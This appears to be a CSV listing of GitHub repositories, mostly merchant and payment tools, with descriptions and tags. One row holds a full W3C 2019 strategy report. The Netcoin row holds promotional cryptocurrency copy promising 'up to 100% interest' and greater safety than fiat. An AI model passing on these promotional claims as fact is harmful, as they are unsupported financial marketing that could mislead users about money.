0,https://github.com/Kovah/Tradefinder.git,A web tool to find the most profitable trades between two merchants. Perfect for gamers. üéÆ,"trading,videogames,gaming,tool,tools,react,spa,calculator",6
0,https://github.com/themestechnology/magento-google-merchant-center-shopping-feed-atom.git,"{""Made for Magento 1.9.0.1+ this script will make an atom xml document for Google's Merchant Center Shopping Feed""}",,6
0,https://github.com/tonolucro/delivery-merchant-php.git,Biblioteca PHP de integra√ß√£o com a //API Tonolucro Merchant,,6
0,https://github.com/schmidyy/boostify.git,Connecting Merchant to Influencers for simple paid promotions üéâ,,6
0,https://github.com/Reverse-Thinking/VoiceBroadcast.git,ÂïÜÊà∑Êî∂Ê¨æËØ≠Èü≥Êí≠Êä• Merchant collection voice broadcast,,6
0,https://github.com/ghassani/miva-sql-component.git,A Miva Merchant Utility/Component Module to Execute SQL Queries in Miva Templating Language,,6
0,https://github.com/zdyshine/Classification-merchant-signs.git,2018 Baidu merchant signboard classification and testing contestÔºö2018ÁôæÂ∫¶ÂïÜÂÆ∂ÊãõÁâåÁöÑÂàÜÁ±ª‰∏éÊ£ÄÊµãÂ§ßËµõ,,6
0,https://github.com/BlockchainLabs/NetCoin.git,"Why NETCOIN (NET) Netcoin, like anything else in the world, is ‚Äúworth‚Äù what we as a species value it to be.  Which, of course then begs the question, why should we value Netcoin?  For starters:  It‚Äôs a safer way to use/spend/receive money than Fiat (for example‚Ä¶.USD/GBP/CNY) It‚Äôs a faster way to send/receive money than Fiat It‚Äôs not subject to the inflation escalations we‚Äôve observed with fiat currencies of recent It‚Äôs built off of and developed from the same trusted technology as Bitcoin It‚Äôs Faster than Bitcoin You can earn up to 100% interest on the amount of NET you own and store in your personal wallet* Current Value of NET NET (NET) 0.00000037 BTC ‚Üë NET (NET) 0.00024805 USD ‚Üë NET (NET) 0.00164974 CNY ‚Üë NET (NET) 0.00022426 EUR ‚Üë Updated 12 July 2016 17:42:32 UTC+1:00 Powered by Cryptonator BASICS FOR GETTING STARTED GET NET  One of the First things to do (besides saying hi to the community) is to obtain your own NET wallet.  This fantastic little secure and safe program operates as your own Personal Bank.  The wallet is where your NET are securely stored and also where you will Deposit, Withdraw, and Send your NET. ADD NET  Next, you‚Äôll want to add some NET to your wallet (Why?  Because you can earn interest‚Ä¶or what‚Äôs called ‚Äúminting‚Äù, on every NET you hold in your wallet that‚Äôs connected to the Network). USE NET  Now you can start to use NET just like you would money.  The number of Merchants accepting NET is growing, and the more we build (the community, NET features, NET acceptance), the sooner we‚Äôll be able to use NET for everyday transactions. FREQUENTLY ASKED QUESTIONS What is Netcoin (NET)? Netcoin is a global cryptocurrency that was created in September, 2013.  Originally based on litecoin‚Äôs coin core, it has since been developed and upgraded to include custom coin code making it unique from every other crypto.  What‚Äôs its algorithm? Every coin has an algorithm (or put another way, its base code).  Netcoin is a scrypt Proof of Work / Proof of Stake hybrid.  How can I get NET? The easiest method of obtaining NET at the present time is by asking for some :)  We‚Äôll gladly get you set up if you ask (with your own wallet and Netcoins).  After that, you can exchange your Fiat currency for satoshi (or bitcoin), and then trade that for NET on several exchanges.  How much is this going to cost me? Netcoin is free to use.  This is unlike current banks and ‚Äúpayment processors‚Äù‚Ä¶where you are charged 1%, 2% or sometimes upwards of 5% for using their services.  With NET, you have the ability to send as little or as much money as you‚Äôd like to anyone else that has a NET wallet.  It‚Äôs that simple.  How can I help NET? Simple! By telling your friends, family, neighbors and even pets! Netcoin is a very easy and friendly cryptocurrency that anyone can understand! By spreading the knowledge about Netcoin further we will all grow together and rise to the new futures that we all have before us!  Additionally, feel free to contact us if you‚Äôd like to help support Netcoin in a more official manner.",,6
0,https://github.com/jettbrains/-L-.git,"W3C Strategic Highlights  September 2019  This report was prepared for the September 2019 W3C Advisory Committee Meeting (W3C Member link). See the accompanying W3C Fact Sheet ‚Äî September 2019. For the previous edition, see the April 2019 W3C Strategic Highlights. For future editions of this report, please consult the latest version.  A Chinese translation is available.  ‚ò∞ Contents  Introduction Future Web Standards Meeting Industry Needs Web Payments Digital Publishing Media and Entertainment Web & Telecommunications Real-Time Communications (WebRTC) Web & Networks Automotive Web of Things Strengthening the Core of the Web HTML CSS Fonts SVG Audio Performance Web Performance WebAssembly Testing Browser Testing and Tools WebPlatform Tests Web of Data Web for All Security, Privacy, Identity Internationalization (i18n) Web Accessibility Outreach to the world W3C Developer Relations W3C Training Translations W3C Liaisons Introduction  This report highlights recent work of enhancement of the existing landscape of the Web platform and innovation for the growth and strength of the Web.  33 working groups and a dozen interest groups enable W3C to pursue its mission through the creation of Web standards, guidelines, and supporting materials. We track the tremendous work done across the Consortium through homogeneous work-spaces in Github which enables better monitoring and management.  We are in the middle of a period where we are chartering numerous working groups which demonstrate the rapid degree of change for the Web platform:  After 4 years, we are nearly ready to publish a Payment Request API Proposed Recommendation and we need to soon charter follow-on work. In the last year we chartered the Web Payment Security Interest Group. In the last year we chartered the Web Media Working Group with 7 specifications for next generation Media support on the Web. We have Accessibility Guidelines under W3C Member review which includes Silver, a new approach. We have just launched the Decentralized Identifier Working Group which has tremendous potential because Decentralized Identifier (DID) is an identifier that is globally unique, resolveable with high availability, and cryptographically verifiable. We have Privacy IG (PING) under W3C Member review which strengthens our focus on the tradeoff between privacy and function. We have a new CSS charter under W3C Member review which maps the group\'s work for the next three years. In this period, W3C and the WHATWG have succesfully completed the negotiation of a Memorandum of Understanding rooted in the mutual belief that that having two distinct specifications claiming to be normative is generally harmful for the Web community. The MOU, signed last May, describes how the two organizations are to collaborate on the development of a single authoritative version of the HTML and DOM specifications. W3C subsequently rechartered the HTML Working Group to assist the W3C community in raising issues and proposing solutions for the HTML and DOM specifications, and for the production of W3C Recommendations from WHATWG Review Drafts.  As the Web evolves continuously, some groups are looking for ways for specifications to do so as well. So-called ""evergreen recommendations"" or ""living standards"" aim to track continuous development (and maintenance) of features, on a feature-by-feature basis, while getting review and patent commitments.  We see the maturation and further development of an incredible number of new technologies coming to the Web. Continued progress in many areas demonstrates the vitality of the W3C and the Web community, as the rest of the report illustrates.  Future Web Standards W3C has a variety of mechanisms for listening to what the community thinks could become good future Web standards. These include discussions with the Membership, discussions with other standards bodies, the activities of thousands of participants in over 300 community groups, and W3C Workshops. There are lots of good ideas. The W3C strategy team has been identifying promising topics and invites public participation.   Future, recent and under consideration Workshops include:  Inclusive XR (5-6 November 2019, Seattle, WA, USA) to explore existing and future approaches on making Virtual and Augmented Reality experiences more inclusive, including to people with disabilities; W3C Workshop on Data Models for Transportation (12-13 September 2019, Palo Alto, CA, USA) W3C Workshop on Web Games (27-28 June 2019, Redmond, WA, USA), view report Second W3C Workshop on the Web of Things (3-5 June 2019, Munich, Germany) W3C Workshop on Web Standardization for Graph Data; Creating Bridges: RDF, Property Graph and SQL (4-6 March 2019, Berlin, Germany), view report Web & Machine Learning. The Strategy Funnel documents the staff\'s exploration of potential new work at various phases: Exploration and Investigation, Incubation and Evaluation, and eventually to the chartering of a new standards group. The Funnel view is a GitHub Project where new area are issues represented by ‚Äúcards‚Äù which move through the columns, usually from left to right. Most cards start in Exploration and move towards Chartering, or move out of the funnel.  Public input is welcome at any stage but particularly once Incubation has begun. This helps W3C identify work that is sufficiently incubated to warrant standardization, to review the ecosystem around the work and indicate interest in participating in its standardization, and then to draft a charter that reflects an appropriate scope. Ongoing feedback can speed up the overall standardization process.  Since the previous highlights document, W3C has chartered a number of groups, and started discussion on many more:  Newly Chartered or Rechartered  Web Application Security WG (03-Apr) Web Payment Security IG (17-Apr) Patent and Standards IG (24-Apr) Web Applications WG (14-May) Web & Networks IG (16-May) Media WG (23-May) Media and Entertainment IG (06-Jun) HTML WG (06-Jun) Decentralized Identifier WG (05-Sep) Extended  Privacy IG (PING) (30-Sep) Verifiable Claims WG (30-Sep) Service Workers WG (31-Dec) Dataset Exchange WG (31-Dec) Web of Things Working Group (31-Dec) Web Audio Working Group (31-Dec) Proposed charters / Advance Notice  Accessibility Guidelines WG Privacy IG (PING) RDF Literal Direction WG Timed Text WG CSS WG Web Authentication WG Closed  Internationalization Tag Set IG Meeting Industry Needs Web Payments   All Web Payments specifications  W3C\'s payments standards enable a streamlined checkout experience, enabling a consistent user experience across the Web with lower front end development costs for merchants. Users can store and reuse information and more quickly and accurately complete online transactions.  The Web Payments Working Group has republished Payment Request API as a Candidate Recommendation, aiming to publish a Proposed Recommendation in the Fall 2019, and is discussing use cases and features for Payment Request after publication of the 1.0 Recommendation. Browser vendors have been finalizing implementation of features added in the past year (view the implementation report).  As work continues on the Payment Handler API and its implementation (currently in Chrome and Edge Canary), one focus in 2019 is to increase adoption in other browsers. Recently, Mastercard demonstrated the use of Payment Request API to carry out EMVCo\'s Secure Remote Commerce (SRC) protocol whose payment method definition is being developed with active participation by Visa, Mastercard, American Express, and Discover. Payment method availability is a key factor in merchant considerations about adopting Payment Request API. The ability to get uniform adoption of a new payment method such as Secure Remote Commerce (SRC) also depends on the availability of the Payment Handler API in browsers, or of proprietary alternatives.  Web Monetization, which the Web Payments Working Group will discuss again at its face-to-face meeting in September, can be used to enable micropayments as an alternative revenue stream to advertising.  Since the beginning of 2019, Amazon, Brave Software, JCB, Certus Cybersecurity Solutions and Netflix have joined the Web Payments Working Group.  In April, W3C launched the Web Payment Security Group to enable W3C, EMVCo, and the FIDO Alliance to collaborate on a vision for Web payment security and interoperability. Participants will define areas of collaboration and identify gaps between existing technical specifications in order to increase compatibility among different technologies, such as:  How do SRC, FIDO, and Payment Request relate? The Payment Services Directive 2 (PSD2) regulations in Europe are scheduled to take effect in September 2019. What is the role of EMVCo, W3C, and FIDO technologies, and what is the current state of readiness for the deadline? How can we improve privacy on the Web at the same time as we meet industry requirements regarding user identity? Digital Publishing   All Digital Publishing specifications, Publication milestones  The Web is the universal publishing platform. Publishing is increasingly impacted by the Web, and the Web increasingly impacts Publishing.  Topic of particular interest to Publishing@W3C include typography and layout, accessibility, usability, portability, distribution, archiving, offline access, print on demand, and reliable cross referencing. And the diverse publishing community represented in the groups consist of the traditional ""trade"" publishers, ebook reading system manufacturers, but also publishers of audio book, scholarly journals or educational materials, library scientists or browser developers.  The Publishing Working Group currently concentrates on Audiobooks which lack a comprehensive standard, thus incurring extra costs and time to publish in this booming market. Active development is ongoing on the future standard:  Publication Manifest Audiobook profile for Web Publications Lightweight Packaging Format The BD Comics Manga Community Group, the Synchronized Multimedia for Publications Community Group, the Publishing Community Group and a future group on archival, are companions to the working group where specific work is developed and incubated.  The Publishing Community Group is a recently launched incubation channel for Publishing@W3C. The goal of the group is to propose, document, and prototype features broadly related to:  publications on the Web reading modes and systems and the user experience of publications The EPUB 3 Community Group has successfully completed the revision of EPUB 3.2.  The Publishing Business Group fosters ongoing participation by members of the publishing industry and the overall ecosystem in the development of Web infrastructure to better support the needs of the industry. The Business Group serves as an additional conduit to the Publishing Working Group and several Community Groups for feedback between the publishing ecosystem and W3C. The Publishing BG has played a vital role in fostering and advancing the adoption and continued development of EPUB 3. In particular the BG provided critical support to the update of EPUBCheck to validate EPUB content to the new EPUB 3.2 specification. This resulted in the development, in conjunction with the EPUB3 Community Group, of a new generation of EPUBCheck, i.e., EPUBCheck 4.2 production-ready release.  Media and Entertainment   All Media specifications  The Media and Entertainment vertical tracks media-related topics and features that create immersive experiences for end users. HTML5 brought standard audio and video elements to the Web. Standardization activities since then have aimed at turning the Web into a professional platform fully suitable for the delivery of media content and associated materials, enabling missing features to stream video content on the Web such as adaptive streaming and content protection. Together with Microsoft, Comcast, Netflix and Google, W3C received an Technology & Engineering Emmy Award in April 2019 for standardization of a full TV experience on the Web. Current goals are to:  Reinforce core media technologies: Creation of the Media Working Group, to develop media-related specifications incubated in the WICG (e.g. Media Capabilities, Picture-in-picture, Media Session) and maintain maintain/evolve Media Source Extensions (MSE) and Encrypted Media Extensions (EME). Improve support for Media Timed Events: data cues incubation. Enhance color support (HDR, wide gamut), in scope of the CSS WG and in the Color on the Web CG. Reduce fragmentation: Continue annual releases of a common and testable baseline media devices, in scope of the Web Media APIs CG and in collaboration with the CTA WAVE Project. Maintain the Road-map of Media Technologies for the Web which highlights Web technologies that can be used to build media applications and services, as well as known gaps to enable additional use cases. Create the future: Discuss perspectives for Media and Entertainment for the Web. Bring the power of GPUs to the Web (graphics, machine learning, heavy processing), under incubation in the GPU for the Web CG. Transition to a Working Group is under discussion. Determine next steps after the successful W3C Workshop on Web Games of June 2019. View the report. Timed Text  The Timed Text Working Group develops and maintains formats used for the representation of text synchronized with other timed media, like audio and video, and notably works on TTML, profiles of TTML, and WebVTT. Recent progress includes:  A robust WebVTT implementation report poises the specification for publication as a proposed recommendation. Discussions around re-chartering, notably to add a TTML Profile for Audio Description deliverable to the scope of the group, and clarify that rendering of captions within XR content is also in scope. Immersive Web  Hardware that enables Virtual Reality (VR) and Augmented Reality (AR) applications are now broadly available to consumers, offering an immersive computing platform with both new opportunities and challenges. The ability to interact directly with immersive hardware is critical to ensuring that the web is well equipped to operate as a first-class citizen in this environment.  The Immersive Web Working Group has been stabilizing the WebXR Device API while the companion Immersive Web Community Group incubates the next series of features identified as key for the future of the Immersive Web.  W3C plans a workshop focused on the needs and benefits at the intersection of VR & Accessibility (Inclusive XR), on 5-6 November 2019 in Seattle, WA, USA, to explore existing and future approaches on making Virtual and Augmented Reality experiences more inclusive.  Web & Telecommunications  The Web is the Open Platform for Mobile. Telecommunication service providers and network equipment providers have long been critical actors in the deployment of Web technologies. As the Web platform matures, it brings richer and richer capabilities to extend existing services to new users and devices, and propose new and innovative services.  Real-Time Communications (WebRTC)   All Real-Time Communications specifications  WebRTC has reshaped the whole communication landscape by making any connected device a potential communication end-point, bringing audio and video communications anywhere, on any network, vastly expanding the ability of operators to reach their customers. WebRTC serves as the corner-stone of many online communication and collaboration services.  The WebRTC Working Group aims to bringing WebRTC 1.0 (and companion specification Media Capture and Streams) to Recommendation by the end of 2019. Intense efforts are focused on testing (supported by a dedicated hackathon at IETF 104) and interoperability. The group is considering pushing features that have not gotten enough traction to separate modules or to a later minor revision of the spec.  Beyond WebRTC 1.0, the WebRTC Working Group will focus its efforts on WebRTC NV which the group has started documenting by identifying use cases.  Web & Networks  Recently launched, in the wake of the May 2018 Web5G workshop, the Web & Networks Interest Group is chaired by representatives from AT&T, China Mobile and Intel, with a goal to explore solutions for web applications to achieve better performance and resource allocation, both on the device and network. The group\'s first efforts are around use cases, privacy & security requirements and liaisons.  Automotive   All Automotive specifications  To create a rich application ecosystem for vehicles and other devices allowed to connect to the vehicle, the W3C Automotive Working Group is delivering a service specification to expose all common vehicle signals (engine temperature, fuel/charge level, range, tire pressure, speed, etc.)  The Vehicle Information Service Specification (VISS), which is a Candidate Recommendation, is seeing more implementations across the industry. It provides the access method to a common data model for all the vehicle signals ‚Äìpresently encapsulating a thousand or so different data elements‚Äì and will be growing to accommodate the advances in automotive such as autonomous and driver assist technologies and electrification.  The group is already working on a successor to VISS, leveraging the underlying data model and the VIWI submission from Volkswagen, for a more robust means of accessing vehicle signals information and the same paradigm for other automotive needs including location-based services, media, notifications and caching content.  The Automotive and Web Platform Business Group acts as an incubator for prospective standards work. One of its task forces is using W3C VISS in performing data sampling and off-boarding the information to the cloud. Access to the wealth of information that W3C\'s auto signals standard exposes is of interest to regulators, urban planners, insurance companies, auto manufacturers, fleet managers and owners, service providers and others. In addition to components needed for data sampling and edge computing, capturing user and owner consent, information collection methods and handling of data are in scope.  The upcoming W3C Workshop on Data Models for Transportation (September 2019) is expected to focus on the need of additional ontologies around transportation space.  Web of Things   All Web of Things specifications  W3C\'s Web of Things work is designed to bridge disparate technology stacks to allow devices to work together and achieve scale, thus enabling the potential of the Internet of Things by eliminating fragmentation and fostering interoperability.  Thing descriptions expressed in JSON-LD cover the behavior, interaction affordances, data schema, security configuration, and protocol bindings. The Web of Things complements existing IoT ecosystems to reduce the cost and risk for suppliers and consumers of applications that create value by combining multiple devices and information services. There are many sectors that will benefit, e.g. smart homes, smart cities, smart industry, smart agriculture, smart healthcare and many more.  The Web of Things Working Group is finishing the initial Web of Things standards, with support from the Web of Things Interest Group:  Web of Things Architecture Thing Descriptions Strengthening the Core of the Web HTML   The HTML Working Group was chartered early June to assist the W3C community in raising issues and proposing solutions for the HTML and DOM specifications, and to produce W3C Recommendations from WHATWG Review Drafts.  A few days before, W3C and the WHATWG signed a Memorandum of Understanding outlining the agreement to collaborate on the development of a single version of the HTML and DOM specifications.  Issues and proposed solutions for HTML and DOM done via the newly rechartered HTML Working Group in the WHATWG repositories  The HTML Working Group is targetting November 2019 to bring HTML and DOM to Candidate Recommendations.  CSS  All CSS specifications  CSS is a critical part of the Open Web Platform. The CSS Working Group gathers requirements from two large groups of CSS users: the publishing industry and application developers. Within W3C, those groups are exemplified by the Publishing groups and the Web Platform Working Group. The former requires things like better pagination support and advanced font handling, the latter needs intelligent (and fast!) scrolling and animations.  What we know as CSS is actually a collection of almost a hundred specifications, referred to as ‚Äòmodules‚Äô. The current state of CSS is defined by a snapshot, updated once a year. The group also publishes an index defining every term defined by CSS specifications.  Fonts   All Fonts specifications  The Web Fonts Working Group develops specifications that allow the interoperable deployment of downloadable fonts on the Web, with a focus on Progressive Font Enrichment as well as maintenance of WOFF Recommendations.  Recent and ongoing work includes:  Early API experiments by Adobe and Monotype have demonstrated the feasibility of a font enrichment API, where a server delivers a font with minimal glyph repertoire and the client can query the full repertoire and request additional subsets on-the-fly. In other experiments, the Brotli compression used in WOFF 2 was extended to support shared dictionaries and patch update. Metrics to quantify improvement are a current hot discussion topic. The group will meet at ATypi 2019 in Japan, to gather requirements from the international typography community. The group will first produce a report summarizing the strengths and weaknesses of each prototype solution by Q2 2020. SVG   All SVG specifications  SVG is an important and widely-used part of the Open Web Platform. The SVG Working Group focuses on aligning the SVG 2.0 specification with browser implementations, having split the specification into a currently-implemented 2.0 and a forward-looking 2.1. Current activity is on stabilization, increased integration with the Open Web Platform, and test coverage analysis.  The Working Group was rechartered in March 2019. A new work item concerns native (non-Web-browser) uses of SVG as a non-interactive, vector graphics format.  Audio  The Web Audio Working Group was extended to finish its work on the Web Audio API, expecting to publish it as a Recommendation by year end. The specification enables synthesizing audio in the browser. Audio operations are performed with audio nodes, which are linked together to form a modular audio routing graph. Multiple sources ‚Äî with different types of channel layout ‚Äî are supported. This modular design provides the flexibility to create complex audio functions with dynamic effects.  The first version of Web Audio API is now feature complete and is implemented in all modern browsers. Work has started on the next version, and new features are being incubated in the Audio Community Group.  Performance   Web Performance  All Web Performance specifications  There are currently 18 specifications in development in the Web Performance Working Group aiming to provide methods to observe and improve aspects of application performance of user agent features and APIs. The W3C team is looking at related work incubated in the W3C GPU for the Web (WebGPU) Community Group which is poised to transition to a W3C Working Group. A preliminary draft charter is available.  WebAssembly  All WebAssembly specifications  WebAssembly improves Web performance and power by being a virtual machine and execution environment enabling loaded pages to run native (compiled) code. It is deployed in Firefox, Edge, Safari and Chrome. The specification will soon reach Candidate Recommendation.  WebAssembly enables near-native performance, optimized load time, and perhaps most importantly, a compilation target for existing code bases. While it has a small number of native types, much of the performance increase relative to Javascript derives from its use of consistent typing. WebAssembly leverages decades of optimization for compiled languages and the byte code is optimized for compactness and streaming (the web page starts executing while the rest of the code downloads). Network and API access all occurs through accompanying Javascript libraries -- the security model is identical to that of Javascript.  Requirements gathering and language development occur in the Community Group while the Working Group manages test development, community review and progression of specifications on the Recommendation Track.  Testing  Browser testing plays a critical role in the growth of the Web by:  Improving the reliability of Web technology definitions; Improving the quality of implementations of these technologies by helping vendors to detect bugs in their products; Improving the data available to Web developers on known bugs and deficiencies of Web technologies by publishing results of these tests. Browser Testing and Tools  The Browser Testing and Tools Working Group is developing WebDriver version 2, having published last year the W3C Recommendation of WebDriver. WebDriver acts as a remote control interface that enables introspection and control of user agents, provides a platform- and language-neutral wire protocol as a way for out-of-process programs to remotely instruct the behavior of Web, and emulates the actions of a real person using the browser.  WebPlatform Tests   The WebPlatform Tests project now provides a mechanism which allows to fully automate tests that previously needed to be run manually: TestDriver.  TestDriver enables sending trusted key and mouse events, sending complex series of trusted pointer and key interactions for things like in-content drag-and-drop or pinch zoom, and even file upload.  Since 2014 W3C began work on this coordinated open-source effort to build a cross-browser test suite for the Web Platform, which WHATWG, and all major browsers adopted.  Web of Data   All Data specifications  There have been several great success stories around the standardization of data on the web over the past year.  Verifiable Claims seems to have significant uptake. It is also significant that the Distributed Identifier WG charter has received numerous favorable reviews, and was just recently launched. JSON-LD has been a major success with the large deployment on Web sites via schema.org.  JSON-LD 1.1 completed technical work, about to transition to CR More than 25% of websites today include schema.org data in JSON-LD The Web of Things description is in CR since May, making use of JSON-LD Verifiable Credentials data model is in CR since July, also making use of JSON-LD Continued strong interest in decentralized identifiers Engagement from the TAG with reframing core documents, such as Ethical Web Principles, to include data on the web within their scope Data is increasingly important for all organizations, especially with the rise of IoT and Big Data. W3C has a mature and extensive suite of standards relating to data that were developed over two decades of experience, with plans for further work on making it easier for developers to work with graph data and knowledge graphs.  Linked Data is about the use of URIs as names for things, the ability to dereference these URIs to get further information and to include links to other data. There are ever-increasing sources of open Linked Data on the Web, as well as data services that are restricted to the suppliers and consumers of those services.  The digital transformation of industry is seeking to exploit advanced digital technologies. This will facilitate businesses to integrate horizontally along the supply and value chains, and vertically from the factory floor to the office floor. W3C is seeking to make it easier to support enterprise-wide data management and governance, reflecting the strategic importance of data to modern businesses.  Traditional approaches to data have focused on tabular databases (SQL/RDBMS), Comma Separated Value (CSV) files, and data embedded in PDF documents and spreadsheets. We\'re now in midst of a major shift to graph data with nodes and labeled directed links between them. Graph data is:  Faster than using SQL and associated JOIN operations More favorable to integrating data from heterogeneous sources Better suited to situations where the data model is evolving In the wake of the recent W3C Workshop on Graph Data we are in the process of launching a Graph Standardization Business Group to provide a business perspective with use cases and requirements, to coordinate technical standards work and liaisons with external organizations.  Web for All Security, Privacy, Identity  All Security specifications, all Privacy specifications  Authentication on the Web   As the WebAuthn Level 1 W3C Recommendation published last March is seeing wide implementation and adoption of strong cryptographic authentication, work is proceeding on Level 2.  The open standard Web API gives native authentication technology built into native platforms, browsers, operating systems (including mobile) and hardware, offering protection against hacking, credential theft, phishing attacks, thus aiming to end the era of passwords as a security construct. You may read more in our March press release.  Privacy  An increasing number of W3C specifications are benefitting from Privacy and Security review; there are security and privacy aspects to every specification. Early review is essential. Working with the TAG, the Privacy Interest Group has updated the Self-Review Questionnaire: Security and Privacy.  Other recent work of the group includes public blogging further to the exploration of anti-patterns in standards and permission prompts.  Security  The Web Application Security Working Group adopted Feature Policy, aiming to allow developers to selectively enable, disable, or modify the behavior of some of these browser features and APIs within their application; and Fetch Metadata, aiming to provide servers with enough information to make a priori decisions about whether or not to service a request based on the way it was made, and the context in which it will be used.  The Web Payment Security Interest Group, launched last April, convenes members from W3C, EMVCo, and the FIDO Alliance to discuss cooperative work to enhance the security and interoperability of Web payments (read more about payments).  Internationalization (i18n)   All Internationalization specifications, educational articles related to Internationalization, spec developers checklist  Only a quarter or so current Web users use English online and that proportion will continue to decrease as the Web reaches more and more communities of limited English proficiency. If the Web is to live up to the ""World Wide"" portion of its name, and for the Web to truly work for stakeholders all around the world engaging with content in various languages, it must support the needs of worldwide users as they engage with content in the various languages. The growth of epublishing also brings requirements for new features and improved typography on the Web. It is important to ensure the needs of local communities are captured.  The W3C Internationalization Initiative was set up to increase in-house resources dedicated to accelerating progress in making the World Wide Web ""worldwide"" by gathering user requirements, supporting developers, and education & outreach.  For an overview of current projects see the i18n radar. W3C\'s Internationalization efforts progressed on a number of fronts recently:  Requirements: New African and European language groups will work on the gap analysis, errata and layout requirements. Gap analysis: Japanese, Devanagari, Bengali, Tamil, Lao, Khmer, Javanese, and Ethiopic updated in the gap-analysis documents. Layout requirements document: notable progress tracked in the Southeast Asian Task Force while work continues on Chinese layout requirements. Developer support: Spec reviews: the i18n WG continues active review of specifications of the WHATWG and other W3C Working Groups. Short review checklist: easy way to begin a self-review to help spec developers understand what aspects of their spec are likely to need attention for internationalization, and points them to more detailed checklists for the relevant topics. It also helps those reviewing specs for i18n issues. Strings on the Web: Language and Direction Metadata lays out issues and discusses potential solutions for passing information about language and direction with strings in JSON or other data formats. The document was rewritten for clarity, and expanded. The group is collaborating with the JSON-LD and Web Publishing groups to develop a plan for updating RDF, JSON-LD and related specifications to handle metadata for base direction of text (bidi). User-friendly test format: a new format was developed for Internationalization Test Suite tests, which displays helpful information about how the test works. This particularly useful because those tests are pointed to by educational materials and gap-analysis documents. Web Platform Tests: a large number of tests in the i18n test suite have been ported to the WPT repository, including: css-counter-styles, css-ruby, css-syntax, css-test, css-text-decor, css-writing-modes, and css-pseudo. Education & outreach: (for all educational materials, see the HTML & CSS Authoring Techniques) Web Accessibility   All Accessibility specifications, WAI resources  The Web Accessibility Initiative supports W3C\'s Web for All mission. Recent achievements include:  Education and training: Inaccessibility of CAPTCHA updated to bring our analysis and recommendations up to date with CAPTCHA practice today, concluding two years of extensive work and invaluable input from the public (read more on the W3C Blog Learn why your web content and applications should be accessible. The Education and Outreach Working Group has completed revision and updating of the Business Case for Digital Accessibility. Accessibility guidelines: The Accessibility Guidelines Working Group has continued to update WCAG Techniques and Understanding WCAG 2.1; and published a Candidate Recommendation of Accessibility Conformance Testing Rules Format 1.0 to improve inter-rater reliability when evaluating conformance of web content to WCAG An updated charter is being developed to host work on ""Silver"", the next generation accessibility guidelines (WCAG 2.2) There are accessibility aspects to most specifications. Check your work with the FAST checklist.  Outreach to the world W3C Developer Relations   To foster the excellent feedback loop between Web Standards development and Web developers, and to grow participation from that diverse community, recent W3C Developer Relations activities include:  @w3cdevs tracks the enormous amount of work happening across W3C W3C Track during the Web Conference 2019 in San Francisco Tech videos: W3C published the 2019 Web Games Workshop videos The 16 September 2019 Developer Meetup in Fukuoka, Japan, is open to all and will combine a set of technical demos prepared by W3C groups, and a series of talks on a selected set of W3C technologies and projects W3C is involved with Mozilla, Google, Samsung, Microsoft and Bocoup in the organization of ViewSource 2019 in Amsterdam (read more on the W3C Blog) W3C Training   In partnership with EdX, W3C\'s MOOC training program, W3Cx offers a complete ""Front-End Web Developer"" (FEWD) professional certificate program that consists of a suite of five courses on the foundational languages that power the Web: HTML5, CSS and JavaScript. We count nearly 900K students from all over the world.  Translations  Many Web users rely on translations of documents developed at W3C whose official language is English. W3C is extremely grateful to the continuous efforts of its community in ensuring our various deliverables in general, and in our specifications in particular, are made available in other languages, for free, ensuring their exposure to a much more diverse set of readers.  Last Spring we developed a more robust system, a new listing of translations of W3C specifications and updated the instructions on how to contribute to our translation efforts.  W3C Liaisons   Liaisons and coordination with numerous organizations and Standards Development Organizations (SDOs) is crucial for W3C to:  make sure standards are interoperable coordinate our respective agenda in Internet governance: W3C participates in ICANN, GIPO, IGF, the I* organizations (ICANN, IETF, ISOC, IAB). ensure at the government liaison level that our standards work is officially recognized when important to our membership so that products based on them (often done by our members) are part of procurement orders. W3C has ARO/PAS status with ISO. W3C participates in the EU MSP and Rolling Plan on Standardization ensure the global set of Web and Internet standards form a compatible stack of technologies, at the technical and policy level (patent regime, fragmentation, use in policy making) promote Standards adoption equally by the industry, the public sector, and the public at large Coralie Mercier, Editor, W3C Marketing & Communications $Id: Overview.html,v 1.60 2019/10/15 12:05:52 coralie Exp $ Copyright ¬© 2019 W3C ¬Æ (MIT, ERCIM, Keio, Beihang) Usage policies apply.",,6
0,https://github.com/PrestaShop/advancedeucompliance.git,This module helps merchants in getting compliant with applicable e-commerce law in PrestaShop 1.6.,"obsolete,prestashop-module,prestashop-1-6",5
0,https://github.com/mfauveau/omnipay-nmi.git,NMI (Network Merchants Inc.) driver for the Omnipay PHP payment processing library.,"omnipay,nmi,php,driver,gateways,composer",5
0,https://github.com/RazerMS/Magento_Plugin.git,Razer Merchant Services Magento Shopping Cart Plugin,"molpay-plugin,php,magento-plugin,magento-shopping-cart",5
0,https://github.com/NawabHost/bkash-checkout-for-whmcs.git,Collect payment with bKash Merchant Checkout.,"whmcs,whmcs-payment-gateway,bkash,whmcs-module,payment-gateway",5
0,https://github.com/NarenPamza/Merchant-Guide-to-Galaxy.git,"{""Merchant's Guide to the Galaxy Problem""}",,5
0,https://github.com/hiqdev/php-merchant.git,PHP merchant library,hacktoberfest,5
0,https://github.com/hiqdev/omnipay-yandexmoney.git,Yandex.Money plugin for PHP merchant library,hacktoberfest,5
0,https://github.com/CoinifySoftware/python-sdk.git,A Python wrapper for Coinify merchant API and callbacks,,5
0,https://github.com/anuragphadke19/active_merchant_ebs.git,Active Merchant support for Indian Payment Gateway EBS,,5
0,https://github.com/Moneris/MRC-User-Guide-Canada.git,Merchant Resource Center User Guide - Canada,,5
0,https://github.com/Ecwid/ecwid-app-skeleton-php.git,This project is an application skeleton for a typical app for Ecwid App Market. You can use it to quickly bootstrap your project and create an awesome app for Ecwid merchants,,5
0,https://github.com/globaledgesoft/merchant-cart-aws-iot.git,Merchant Cart demo with AWS IoT integration of Music Festival for Inventory Management,,5
0,https://github.com/gwathlobal/trader-rl.git,A merchant roguelike,,5
0,https://github.com/merchantsedition/merchantsedition.git,"PrestaShop\u202f1.6 created a great framework, thirty bees made it stable, Merchant‚Äôs Edition makes this solution with its rich featureset easily accessible for non-technical merchants. ","e-commerce,ecommerce,prestashop,prestashop-1-6,thirty-bees,merchantsedition",5
0,https://github.com/The-Hive-of-Five/Interstellar-Merchant.git,The primary repository for the Interstellar Merchant game.,,5
0,https://github.com/dre1080/fuel-aktivemerchant.git,A php port of Active Merchant payment project for FuelPHP,,5
0,https://github.com/aldente05/merchant-server-midtrans.git,this is merchant server or backend for midtrans snap payment,,5
0,https://github.com/Arcadier/Profile-Input-Fields.git,:clipboard: Need more information about your merchants or customers on your marketplace site? Add new data fields to their profile pages for them to fill-up.,"plug-in,arcadier,marketplace,data,customisation,customer-data",5
